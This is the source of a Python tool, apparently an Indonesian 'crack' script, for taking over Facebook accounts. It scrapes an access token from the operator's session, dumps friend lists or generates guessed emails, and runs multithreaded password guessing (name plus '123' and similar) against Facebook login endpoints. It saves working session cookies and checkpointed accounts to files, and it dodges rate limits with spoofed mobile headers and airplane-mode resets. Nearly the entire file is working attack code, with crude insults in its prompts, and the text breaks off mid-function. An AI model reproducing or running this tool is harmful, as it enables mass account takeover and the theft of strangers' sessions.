# !/usr/bin/python3
# coding : utf-8

# Coded by : Moch Arif Xyc
# Python version : 3.11.6
# Github   : https://github.com/Xycaa-X-Code
#----------[ MODULE ]----------#
try:
    import os, re, sys, json, time, random, requests
    from datetime import datetime
    from time import time as timeripz
    from bs4 import BeautifulSoup as par
    from rich.console import Console as Cons
    from rich.progress import Progress, TextColumn
    from concurrent.futures import ThreadPoolExecutor
    console = Cons
except:
    try: 
        os.system('pip install bs4')
        os.system('pip install rich')
        os.system('pip install requests')
        os.system('pip install stdiomask')
    except ModuleNotFoundError as e: sys.exit(e)
 
#----------[ COLOR-RICH ]----------#
M = "[#FF0000]" # MERAH
P = "[#FFFFFF]" # PUTIH
H = "[#00FF00]" # HIJAU
K = "[#FFFF00]" # KUNING
B = "[#00C8FF]" # BIRU
J = "[#FF8F00]" # JINGGA
A = "[#AAAAAA]" # ABU-ABU

UaFresto = 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'
dumpid=[]
dumpid2=[]  

coded = ('Coded by %sMoch Arif'%(H))
use = ('Use %sSimpel Force'%(H))
version = ('Version %s1.0'%(H))
status = ('Status %sFree User'%(H))

# HEADERS
class Miya:
    # fuction init
    def __init__(self) -> None:pass
    
    def Useragent(self):
        for digit in range(1000):
            self.device = str(random.choice(["RMX3516",
            "RMX3461","RMX3286","RMX3561","RMX3388",
            "RMX3311","RMX3142","RMX2071","RMX1805",
            "RMX1809","RMX1801","RMX1807","RMX1803",
            "RMX1825","RMX1821","RMX1822","RMX1833",
            "RMX1851","RMX1853","RMX1827","RMX1911",
            "RMX1919","RMX1927","RMX1971","RMX1973",
            "RMX2030","RMX2032","RMX1925","RMX1929",
            "RMX2001","RMX2061","RMX2063","RMX2040",
            "RMX2042","RMX2002","RMX2151","RMX2163",
            "RMX2155","RMX2170","RMX2103","RMX3085",
            "RMX3241","RMX3081","RMX3151","RMX3381",
            "RMX3521","RMX3474","RMX3471","RMX3472",
            "RMX3392","RMX3393","RMX3491","RMX1811",
            "RMX2185","RMX3231","RMX2189","RMX2180",
            "RMX2195","RMX2101","RMX1941","RMX1945",
            "RMX3063","RMX3061","RMX3201","RMX3203",
            "RMX3261","RMX3263","RMX3193","RMX3191",
            "RMX3195","RMX3197","RMX3265","RMX3268",
            "RMX3269","RMX2027","RMX2020","RMX2021",
            "RMX3581","RMX3501","RMX3503","RMX3511",
            "RMX3310","RMX3312","RMX3551","RMX3301",
            "RMX3300","RMX2202","RMX3363","RMX3360",
            "RMX3366","RMX3361","RMX3031","RMX3370",
            "RMX3357","RMX3560","RMX3562","RMX3350",
            "RMX2193","RMX2161","RMX2050","RMX2156",
            "RMX3242","RMX3171","RMX3430","RMX3235",
            "RMX3506","RMX2117","RMX2173","RMX3161",
            "RMX2205","RMX3462","RMX3478","RMX3372",
            "RMX3574","RMX1831","RMX3121","RMX3122",
            "RMX3125","RMX3043","RMX3042","RMX3041",
            "RMX3092","RMX3093","RMX3571","RMX3475",
            "RMX2200","RMX2201","RMX2111","RMX2112",
            "RMX1901","RMX1903","RMX1992","RMX1993",
            "RMX1991","RMX1931","RMX2142","RMX2081",
            "RMX2085","RMX2083","RMX2086","RMX2144",
            "RMX2051","RMX2025","RMX2075","RMX2076",
            "RMX2072","RMX2052","RMX2176","RMX2121",
            "RMX3115","RMX1921","RMX3371"]))
            self.build = (''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(3)))
            self.chrome = str(random.randint(40,114))+'.0.'+str(random.randint(2200,4200))+'.'+str(random.randint(40,140))
            uarealme= 'Mozilla/5.0 (Linux; Android '+str(random.randint(7,13))+'; '+self.device+') Build/'+self.build+') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+self.chrome+' Safari/537.36'
            return(uarealme)
     
    #----------[ HEADERS-LOGIN ]----------#
    def head_login(self):
        headers = {
            "Host": "m.facebook.com",
            "Dpr": "1.53125",
            "Viewport-Width": "980",
            "Sec-Ch-Ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Ch-Ua-Platform-version": '"10.0.0"',
            "Sec-Ch-Ua-Model": '"RMX1821"',
            "Sec-Ch-Ua-Full-Version-List": '"Chromium";v="112.0.5615.47", "Google Chrome";v="112.0.5615.47", "Not:A-Brand";v="99.0.0.0"',
            "Sec-Ch-Prefers-Color-Scheme": "dark",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fadsmanager%2Fmanage%2Fcampaigns%3Fwtsid%3Drdr_072QbFsCLxwR5Rssa&refsrc=deprecated&wtsid=rdr_072QbFsCLxwR5Rssa&_rdr",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,pt;q=0.6"}
        return ( headers )   
        
    #----------[ HEADERS-ASYINC ]----------#
    def head_asyinc(self, response):
        headers = {
            "Host":"free.prod.facebook.com",
            "Cache-Control":"max-age=0",
            "Upgrade-Insecure-Requests":"1",
            "Origin":"https://free.prod.facebook.com",
            "Content-Type":"application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/89.0.4389.116 Safari/534.24 XiaoMi/MiuiBrowser/15.9.16 swan-mibrowser",
            "X-FB-lsd": re.search('name="lsd" value="(.*?)"', str(response)).group(1), 
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "X-Requested-With":"mark.via.gp",
            "sec-Fetch-Site":"none",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-User":"?1",
            "Sec-Fetch-Dest":"document",
            "Referer":"https://free.prod.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fpages%2F%3Fcategory%3Dtop%26ref%3Dbookmarks%26wtsid%3Drdr_0WLXe9WWdaCQsCD7x&refsrc=deprecated&wtsid=rdr_0WLXe9WWdaCQsCD7x&ref=bookmarks&_rdr",
            "Accept-Encoding":"gzip, deflate br",
            "Accept-Language":"id-ID,id;q=0.7,en-US;q=0.8,en;q=0.9",
            "View-Width":"980"}
        return ( headers )   
        
    #----------[ HEADERS-REGULER ]----------#
    def head_reguler(self):
        headers = {
            "Host":"free.prod.facebook.com",
            "Cache-Control":"max-age=0",
            "Upgrade-Insecure-Requests":"1",
            "Origin":"https://free.prod.facebook.com",
            "Content-Type":"application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/89.0.4389.116 Safari/534.24 XiaoMi/MiuiBrowser/15.9.16 swan-mibrowser",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "X-Requested-With":"mark.via.gp",
            "sec-Fetch-Site":"none",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-User":"?1",
            "Sec-Fetch-Dest":"document",
            "Referer":"https://free.prod.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fpages%2F%3Fcategory%3Dtop%26ref%3Dbookmarks%26wtsid%3Drdr_0WLXe9WWdaCQsCD7x&refsrc=deprecated&wtsid=rdr_0WLXe9WWdaCQsCD7x&ref=bookmarks&_rdr",
            "Accept-Encoding":"gzip, deflate br",
            "Accept-Language":"id-ID,id;q=0.7,en-US;q=0.8,en;q=0.9",
            "View-Width":"980"}
        return ( headers )   
        
    #----------[ HEADERS-MOBILE ]----------#
    def head_mobile(self):
        headers = {
            "Host": "free.prod.facebook.com",
            "Viewport-Width": "110",
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Ch-Ua-Platform-version": '"10.0.0"',
            "Sec-Ch-Ua-Model": '""',
            "origin":"https://free.prod.facebook.com",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/89.0.4389.116 Safari/534.24 XiaoMi/MiuiBrowser/15.9.16 swan-mibrowser",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?0",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://free.prod.facebook.com/login.php?next=https%3A%2F%2Ffree.prod.facebook.com%2Fpages%2F%3Fcategory%3Dtop%26ref%3Dbookmarks%26wtsid%3Drdr_0WLXe9WWdaCQsCD7x&refsrc=deprecated&wtsid=rdr_0WLXe9WWdaCQsCD7x&ref=bookmarks&_rdr",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "connection":"Keep-Alive"}
        return ( headers )   
        
    #----------[ HEADERS-EMAIL ]----------#
    def head_email(self):
        headers = {
            "Host":"free.prod.facebook.com",
            "Cache-Control":"max-age=0",
            "Upgrade-Insecure-Requests":"1",
            "Origin":"https://free.prod.facebook.com",
            "Content-Type":"application/x-www-form-urlencoded",
            "User-Agent": self.Useragent(),
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "X-Requested-With":"mark.via.gp",
            "sec-fetch-site":"none",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-User":"?1",
            "Sec-Fetch-Dest":"document",
            "Referer":"https://free.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
            "Accept-Encoding":"gzip, deflate br",
            "Accept-Language":"id-ID,id;q=0.7,en-US;q=0.8,en;q=0.9",
            "View-Width":"980",
            "Connection":"Keep-Alive"}    
        return ( headers )   

# LOGIN
class FanzMiya:   
    # fucktion init
    def __init__(self):
        self.ip = requests.get("http://ip-api.com/json/").json()["query"]
        self.negara = requests.get("http://ip-api.com/json/").json()["country"]
        self.ses = requests.Session()
        self.exec_menu('')
        
    #----------[ DELETED-DATA-LOGIN ]----------#
    def deleted_data(self,file = 'data/login/'):
        try:
            cok = (file+'.cookie.json')
            for cok in os.system('rm -rf '+cok):
                return ( cok )
        except:pass
        try:
            tok = (file+'.token_eaab.json')
            for tok in os.system('rm -rf '+tok):
                return ( tok )
        except:pass
        try:
            nam = (file+'.nama.json')
            for nam in os.system('rm -rf '+nam):
                return ( nam )
        except:pass           
        self.menu_login('')	
    
    #----------[ BANNER ]----------#
    def banner(self):
        if "win" in sys.platform: os.system("cls")
        else: os.system("clear")
        Cons().print('\t%s 0'%(M))
        Cons().print(f'\t%s≤|≥%s %s'%(J,A,coded))  
        Cons().print('\t%s≤|≥%s %s'%(J,A,use)) 
        Cons().print('      %sX %s/ \ %sI'%(A,J,A))    
        Cons().print('  %s0_\__o %sA %so__/_0'%(J,A,J))
        Cons().print('      %sC %s\ / %sA'%(A,J,A))
        Cons().print('\t%s≤|≥%s %s'%(J,A,version)) 
        Cons().print('\t%s≤|≥%s %s'%(J,A,status))
        Cons().print('\t%s 0'%(M))
    
    #----------[ MENU-LOGIN ]----------#
    def menu_login(self, file = 'data/login/'):
        self.banner()
        Cons().print(f'\n {J}»{A} Userip {H}{self.ip}')
        Cons().print(f' {J}»{A} Country {H}{self.negara}')
        Cons().print(f'\n {A}[{J}1{A}] login menggunakan cookie')
        Cons().print(f' {A}[{J}2{A}] login menggunakan id/nama/email')
        CK = Cons().input(f'\n {J}*_»{A} Choose : ')
        
        #----------[ LOGIN-COOKIE ]----------#
        if CK =='1' or CK =='01':
            Cons().print(f'\n {J}# {M}WARNING \n\n {J}*{A} cookies harus fres \n {J}*{A} saran cookie dough \n {J}*{A} jangan akun pribadi')
            cookie = Cons().input(f'\n {J}*_»{A} Cookie : ')
            try:
                tok = self.dapatkan_token_eaab(cookie,'')
                Cons().print(f' {J}*_»{A} Token : {H}{tok}')
                self.dapatkan_username(cookie)
                with open(file+'.cookie.json',mode='w',encoding='utf8') as wr:
                    wr.write(json.dumps({'Cookie': cookie}))
                    wr.close()
                Cons().print(f'\n {J}#{A} login berhasil, silakan jalankan ulang pythonnya'); sys.exit()
            except Exception as e: sys.exit(e)
            
        #----------[ LOGIN-ID-NAMA-EMAIL ]----------#
        elif CK =='2' or CK =='02':
            Cons().print(f'\n {J}*{A} masukan id \n {J}*{A} masukan nama \n {J}*{A} masukan email')
            userid = Cons().input(f'\n {J}*_»{A} id/nama/email : ')
            if userid =='': Cons().print(f'\n {J}*_>{M} kamu kaya kontol');exit()
            userpas = Cons().input(f' {J}*_»{A} Sandi : ')
            if userpas =='': Cons().print(f'\n {J}*_>{M} kamu kaya kontol');exit()
            while True:
                try:
                     response = self.ses.get('https://m.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fadsmanager%2Fmanage%2Fcampaigns%3Fwtsid%3Drdr_072QbFsCLxwR5Rssa&ref=dbl&fl&login_from_aymh=1&refid=9').text
                     encoding = {
                         "lsd": re.search('name="lsd" value="(.*?)"', str(response)).group(1), 
                         "jazoest": re.search('name="jazoest" value="(\d+)"', str(response)).group(1), 
                         "m_ts": re.search('name="m_ts" value="(.*?)"', str(response)).group(1), 
                         "li": re.search('name="li" value="(.*?)"', str(response)).group(1), 
                         "try_number": 0, 
                         "unrecognized_tries": 0, 
                         "email":userid, 
                         "pass": userpas,
                         "login":"Log + In", 
                         "bi_xrwh": 0}
                     headers = Miya().head_login()
                     params = {'next':'https://m.facebook.com/adsmanager/manage/campaigns?wtsid=rdr_072QbFsCLxwR5Rssa','ref':'dbl','fl':'','login_from_aymh':'1','refid':'9'}
                     response = par(self.ses.post('https://m.facebook.com/login/',data=encoding, params=params, headers=headers, allow_redirects=False).text,"html.parser")
                except ConnectionError as e: sys.exit(e)
                except:pass
                try:
                    payload = self.ses.cookies.get_dict()
                    if 'c_user' or payload.keys():
                       cookie = ';'.join(['%s=%s'%(name,value) for name,value in self.ses.cookies.get_dict().items()])
                       Cons().print(f'\n {J}*_»{A} Cookie : {H}{cookie}')
                       tok = self.dapatkan_token_eaab(cookie,'')
                       Cons().print(f' {J}*_»{A} Token : {H}{tok}')
                       self.dapatkan_username(cookie)
                       with open(file+'.cookie.json',mode='w',encoding='utf8') as wr:
                           wr.write(json.dumps({'Cookie': cookie}))
                           wr.close()
                       Cons().print(f'\n {J}#{A} login berhasil, silakan jalankan ulang pythonnya'); sys.exit()
                    break
                except Exception as e: sys.exit(e)
        else: Cons().print(f'\n {J}*_>{M} oke brooo ');exit()
            
    #----------[ TOKEN-EAAB ]----------#
    def dapatkan_token_eaab(self, cookie, file = 'data/login/'):
        try:
            url = self.ses.get("https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1",cookies={"cookie": cookie})
            src = re.search('act=(\d+)',url.text).group(1)
            try:
                act = self.ses.get("https://adsmanager.facebook.com/adsmanager/manage/campaigns?act=%s&breakdown_regrouping=1"%(src),cookies={"cookie": cookie})
                tok = re.search('.__accessToken="(.*?)"',act.text).group(1)
                with open(file+'.token_eaab.json',mode='w',encoding='utf8') as wr:
                    wr.write(json.dumps({'Token': tok}))
                    wr.close()
                return tok
            except ConnectionError as e: sys.exit(e)        
        except AttributeError as e: sys.exit(e)   
    
    #----------[ MENGAMBIL-USERNAME ]----------#
    def dapatkan_username(self, cookie):
        try:
            url = par(self.ses.get("https://www.facebook.com/profile.php",headers={'User-Agent':UaFresto}, cookies={'cookie':cookie}).text, "html.parser")
            try:
                nam = re.findall('<title>(.*?)</title>',str(url))[0]
                with open('.nama.json',mode='w',encoding='utf8') as wr:
                    wr.write(json.dumps({'Nama': nam}))
                    wr.close()
                return nam
            except ConnectionError as e: sys.exit(e)        
        except AttributeError as e: sys.exit(e)

    #----------[ MENU-CRACKING ]----------# 
    def exec_menu(self, file = 'data/login/'):
        try:
            name = json.loads(open(file+'.nama.json', 'r').read())['Nama']
            token = json.loads(open(file+'.token_eaab.json', 'r').read())['Token']
            cookie = json.loads(open(file+'.cookie.json', 'r').read())['Cookie']
        except FileNotFoundError as e: print(e); time.sleep(2); self.deleted_data('')
        self.banner()
        Cons().print(f'\n {J}»{A} Name {H}{name}')
        Cons().print(f' {J}»{A} Userip {H}{self.ip}')
        Cons().print(f' {J}»{A} Country {H}{self.negara}')
        Cons().print(f'\n {A}[{J}1{A}] Crack from publik')
        Cons().print(f' {A}[{J}2{A}] Crack from files')
        Cons().print(f' {A}[{J}3{A}] Crack from email')
        Cons().print(f' {A}[{J}4{A}] Crack from name')
        Cons().print(f' {A}[{J}5{A}] Cek result ok/cp')
        Cons().print(f' {A}[{J}6{A}] Lapor bug script')
        Cons().print(f' {A}[{J}0{A}] keluar dari tools')
        FCF = Cons().input(f'\n {J}*_»{A} Choose : ')
        
        #----------[ CRACK-PUBLIK ]----------#
        if FCF =='1' or FCF =='01':
            Cons().print(f'\n {J}#{A} Banyaknya id, pisahkan dengan koma')
            user = Cons().input(f' {J}*_»{A} ID : ')
            if user =='': Cons().print(f'\n {J}*_>{M} kamu kaya kontol');exit()
            Cons().print(f'\n {J}#{A} Ketik ctrl + c untuk berhenti dump')
            for uuid in user.split(','):
                try:
                    Dump().dump_publik(uuid,cookie,token,'')
                except KeyboardInterrupt: pass
                except Exception as e: sys.exit(e)
                Crack().Generate_list()
                
       #----------[ CRAK-EMAIL ]----------#       
        elif FCF =='3' or FCF =='03':
            Cons().print(f'\n {J}#{A} Banyaknya Nama, pisahkan dengan koma')
            user = Cons().input(f' {J}*_»{A} Nama : ')
            if user =='': Cons().print(f'\n {J}*_>{M} kamu kaya kontol');exit()
            total = Cons().input(f' {J}*_»{A} Limit : ')
            if total =='': Cons().print(f'\n {J}*_>{M} kamu kaya kontol');exit()
            Cons().print(f'\n {J}#{A} example ({H}@gmail.com, yahoo.com, dll{A})')
            doma = Cons().input(f' {J}*_»{A} Domain : ')
            if doma =='': Cons().print(f'\n {J}*_>{M} kamu kaya kontol');exit()
            Cons().print(f'\n {J}#{A} Ketik ctrl + c untuk berhenti dump')
            for nama in user.split(','):
                try:
                    Dump().dump_email(nama,total,doma)
                except KeyboardInterrupt: pass
                except Exception as e: sys.exit(e)
                CrackM().Generate_listM()
                
        #----------[ LAPOR-BUG ]----------#          
        elif FCF =='6' or FCF =='6':
            xxx = ('Assalamualaikum')
            try:
               for teks in xxx:
                   os.system('xdg-open  https://wa.me/6282332906334?text='+teks)
            except Exception as e: sys.exit(e)
                
        #----------[ DELETE-DATA ]----------#
        elif FCF =='0' or FCF =='00':
            KC = Cons().input(f'\n {J}#{A} ingin keluar atau dengan hapus cookie ( y/t ): ')
            if KC in ['y','Ya','Y','YA']: self.deleted_data('')
            else: sys.exit()
            
        else: Cons().print(f'\n {J}*_>{M} oke brooo ');exit()   

# DUMP                                         
class Dump:
    # fuction init
    def __init__(self) -> None:pass
        
    #----------[ DUMP-PUBLIK ]----------#
    def dump_publik(self,uuid,cookie,token,fields):
        try:
            if len(dumpid) == 0:
                params = {"access_token": token,"fields": "friends.fields(id,name)"}
            else:
                params = {"access_token": token,"fields": f"friends.fields(id,name).after({fields})"}
            response = requests.get("https://graph.facebook.com/v18.0/%s"%(uuid),params=params,cookies={'cookie':cookie}).json()
            for xyz in response['friends']['data']:
                format = '%s<=>%s'%(xyz['id'],xyz['name'])
                if format not in dumpid:
                    dumpid.append(format)
                    Cons().print(f' {J}*_»{A} sedang dump {H}{str(len(dumpid))}{A} idz',end='\r'); sys.stdout.flush()
            if 'fields' in str(response):
                self.dump_publik(uuid,cookie,token,response["friends"]["paging"]["cursors"]["after"])
        except ( KeyboardInterrupt ): pass
        except ( Exception ) as e: sys.exit(e)
        
    #----------[ DUMP-EMAIL ]----------#
    def dump_email(self,nama,total,doma):
        org = ['tuti','astutik','warsi','warsinah','mariati','manda','putri','putra','safitri','saputra','dikul','mursyid','ardi','ardian','diancm','dinda','rahma','fajar','rendi','risky','difa','andika','yaya','gilang','galang','aldi','aldo','revaldo','revaldi','yossy','sulis','caca','cici','arif','zainal','arifin','dika','bayu','ferly']
        drh = ['semarang','boyolali','cilacap','kebumen','banyumas','tuban','sumedang','sragen','sunda','garut','cirebon','sukabumi','medan','suroboyo','surabaya','cilacap','jepara','tasik','malang','jogja','kediri','kudus','jember','situbondo','wonosobo','trenggalek','gresik','bangkalan','jombang','lamongan','lumajang','madiun','magetan','mojokerto','nganjuk','pacitan','ngawi','pasuruan','ponorogo','pamengkasan','sidoarjo','blitar','banjarnegara','brebes','grobokan','karanganyar','kendal','klaten','kudus','pati','pekalongan','rembang','temanggung','wonogiri','wonosobo','sukoharjo','bandung','ciamis','cianjur','cirebon','indramayu','sumedang','purwakarta','bogor']
        blk = ['12','123','1234','12345','official','gaming','pribadi']
        for i in range(int(total)):
            nam = (nama+str(random.choice([f'{str(random.choice(org))}',f'{str(random.randint(0,90))}',f'{str(random.choice(blk))}{str(random.randint(0,90))}',f'{str(random.choice(org))}{str(random.randint(0,90))}',f'{str(random.choice(drh))}{str(random.randint(0,90))}']))+doma)
            if nam not in dumpid:
                dumpid.append(nam+'<=>'+nama)
            Cons().print(f' {J}#{A} sedang dump {H}{str(len(dumpid))}{A} idz',end='\r'); sys.stdout.flush()
        return(dumpid)
           
# CRACK       
class Crack:   
    # fuction init
    def __init__(self):
        self.ses = requests.Session()
        self.live, self.ceck, self.loop = 0,0,0
        
    #----------[ WORDLIST ]----------# 
    def Generate_list(self):
        global prog,des
        print('\n')
        self.okc,self.cpc = self.hasil_crack()
        Cons().print(f' {A}[{J}1{A}] Asyinc')
        Cons().print(f' {A}[{J}2{A}] Reguler')
        Cons().print(f' {A}[{J}3{A}] Mobile')
        execlogin = Cons().input(f'\n {J}*_»{A} Choose : ')
        Cons().print(f'\n {A}[{J}*{A}] Hasil OK Simpan/{H}{self.okc}')
        Cons().print(f' {A}[{J}*{A}] Hasil CP Simpan/{K}{self.cpc}')
        Cons().print(f'\n {J}# {A}Mainkan Mode Pesawat Setiap 300 ID\n')
        prog = Progress(TextColumn("{task.description}"), TextColumn("{task.percentage:.0f}%"))
        des = prog.add_task('',total=len(dumpid))
        with prog:
            with ThreadPoolExecutor(max_workers=30) as V:
                for akun in dumpid:
                    userid, username = akun.split('<=>')[0], akun.split('<=>')[1].lower()
                    password = self.Generate_pas(username)
                    if execlogin =='1' or execlogin  =='01':
                        V.submit(self.Asyinc,userid,password) 
                    elif execlogin =='2' or execlogin  =='02':
                        V.submit(self.Reguler,userid,password) 
                    elif execlogin =='3' or execlogin  =='03':
                        V.submit(self.Mobile,userid,password)
                    else:(V.submit(self.Asyinc,userid,password))
                    
     #----------[ PASSWORD ]----------#             
    def Generate_pas(self,username):
        for nama in username.split(' '):
            nama.lower()
            if len(nama) == 3 or len(nama) == 4 or len(nama) == 5: password = [nama, nama+"123", nama+"1234", nama+"12345", nama+"123456"]
            else: password = [nama, nama+"123", nama+"1234", nama+"12345", nama+"123456"]
        return ( password )
                    
       #----------[ CHECK-RESULT ]----------# 
        if self.live == 0 or self.ceck ==0:
            Cons().print(f'\n {A}[{M}*{A}] Opss, anda tidak mendapatkan hasil')
        else:
            Cons().print(f'\n {A}[{J}*{A}] Selamat, anda mendapatkan hasil OK : {H}{self.live}{A} dan hasil CP : {K}{self.ceck}{A}')
                    
    #----------[ RESULT ]----------# 
    def hasil_crack(self):
        now = datetime.now()
        day = now.day
        year = now.year
        month = now.month
        try:
            if month < 0 or month > 12:exit()
            else: month - 0
            self.okc = f'OK-{day}-{month}-{year}.txt'
            self.cpc = f'CP-{day}-{month}-{year}.txt'  
        except ValueError:sya.exit(e)
        return self.okc, self.cpc

    #-----[ METHOD-ASYINC ]-----#
    def Asyinc(self,userid,password):
        prog.update(des,description=f' {J}# {A}ASYINC {J}*_> {H}OK {A}-: {H}{self.live} {K}CP {A}-: {K}{self.ceck} {J}Die {A}-: {J}{len(dumpid)}/{self.loop}{A}')
        prog.advance(des) 
        for userpas in password:
            try:
                response = self.ses.get('https://free.prod.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fpages%2F%3Fcategory%3Dtop%26ref%3Dbookmarks%26wtsid%3Drdr_0WLXe9WWdaCQsCD7x&ref=bookmarks&fl&login_from_aymh=1&refid=9').text
                encoding = {
                    "lsd": re.search('name="lsd" value="(.*?)"', str(response)).group(1), 
                    "jazoest": re.search('name="jazoest" value="(\d+)"', str(response)).group(1), 
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(response)).group(1), 
                    "li": re.search('name="li" value="(.*?)"', str(response)).group(1), 
                    "try_number": 0, 
                    "unrecognized_tries": 0, 
                    "email":userid,
                    "encpass": "#PWD_BROWSER:0:{}:{}".format(str(timeripz()).split('.')[0], userpas),
                    "login":"Log + In", 
                    "bi_xrwh": 0}
                headers = Miya().head_asyinc(response)
                cookies = ';'.join(['%s=%s'%(name, value) for name, value in self.ses.cookies.get_dict().items()])
                params = {'next':'https://free.prod.facebook.com/pages/?category=top&ref=bookmarks&wtsid=rdr_0WLXe9WWdaCQsCD7x','ref':'bookmarks','fl':'','login_from_aymh':'1','refid':'9'}
                response = par(self.ses.post('https://free.prod.facebook.com/login/device-based/login/async/',data=encoding,params=params,cookies={'cookie':cookies},headers=headers,allow_redirects=False).text,"html.parser")
                payload = self.ses.cookies.get_dict()
                if 'c_user' in payload.keys():
                    coki = ';'.join(['%s=%s'%(name,value) for name,value in self.ses.cookies.get_dict().items()])
                    print(f' {J}*__> {H}{userid}{J}<=>{H}{userpas}{J}<=>{H}{coki}{A}',end='\r'); sys.stdout.flush()
                    print(f' {J}*__> {H}{coki}{A}',end='\r'); sys.stdout.flush()
                    resok=('%s<=>%s<=>%s'%(userid,userpas,coki)) 
                    with open('OK/'+self.okc,'a') as wr:
                        wr.write(resok)
                        wr.close()       
                    self.live+=1                       
                    break                        
                elif 'checkpoint' in payload.keys():
                    print(f' {J}*__> {K}{userid}{J}<=>{K}{userpas}{A}',end='\r'); sys.stdout.flush()
                    rescp=('%s<=>%s<=>%s'%(userid,userpas))         
                    with open('CP/'+self.cpc,'a') as wr:
                        wr.write(rescp)
                        wr.close()    
                    self.ceck+=1                         
                    break
                else:continue
            except ( requests.exceptions.ConnectionError ):time.sleep(31)
        self.loop+=1
        
    #-----[ METHOD-REGULER ]-----#
    def Reguler(self,userid,password):
        prog.update(des,description=f' {J}# {A}REGULER {J}*_> {H}OK {A}-: {H}{self.live} {K}CP {A}-: {K}{self.ceck} {J}Die {A}-: {J}{len(dumpid)}/{self.loop}{A}')
        prog.advance(des) 
        for userpas in password:
            try:
                response = self.ses.get('https://free.prod.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fpages%2F%3Fcategory%3Dtop%26ref%3Dbookmarks%26wtsid%3Drdr_0WLXe9WWdaCQsCD7x&ref=bookmarks&fl&login_from_aymh=1&refid=9').text
                encoding = {
                    "lsd": re.search('name="lsd" value="(.*?)"', str(response)).group(1), 
                    "jazoest": re.search('name="jazoest" value="(\d+)"', str(response)).group(1), 
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(response)).group(1), 
                    "li": re.search('name="li" value="(.*?)"', str(response)).group(1), 
                    "try_number": 0, 
                    "unrecognized_tries": 0, 
                    "email":userid,
                    "encpass": "#PWD_BROWSER:0:{}:{}".format(str(timeripz()).split('.')[0], userpas),
                    "login":"Log + In", 
                    "bi_xrwh": 0}
                headers = Miya().head_reguler()
                cookies = ';'.join(['%s=%s'%(name, value) for name, value in self.ses.cookies.get_dict().items()])
                params = {'next':'https://free.prod.facebook.com/pages/?category=top&ref=bookmarks&wtsid=rdr_0WLXe9WWdaCQsCD7x','ref':'bookmarks','fl':'','login_from_aymh':'1','refid':'9'}
                response = par(self.ses.post('https://free.prod.facebook.com/login/device-based/reguler/login/',data=encoding,params=params,cookies={'cookie':cookies},headers=headers,allow_redirects=False).text,"html.parser")
                payload = self.ses.cookies.get_dict()
                if 'c_user' in payload.keys():
                    coki = ';'.join(['%s=%s'%(name,value) for name,value in self.ses.cookies.get_dict().items()])
                    print(f' {J}*__> {H}{userid}{J}<=>{H}{userpas}{J}<=>{H}{coki}{A}',end='\r'); sys.stdout.flush()
                    resok=('%s<=>%s<=>%s'%(userid,userpas,coki)) 
                    with open('OK/'+self.okc,'a') as wr:
                        wr.write(resok)
                        wr.close()   
                    self.live+=1                           
                    break                        
                elif 'checkpoint' in payload.keys():
                    print(f' {J}*__> {K}{userid}{J}<=>{K}{userpas}{A}',end='\r'); sys.stdout.flush()
                    rescp=('%s<=>%s<=>%s'%(userid,userpas))         
                    with open('CP/'+self.cpc,'a') as wr:
                        wr.write(rescp)
                        wr.close()    
                    self.ceck+=1                         
                    break
                else:continue
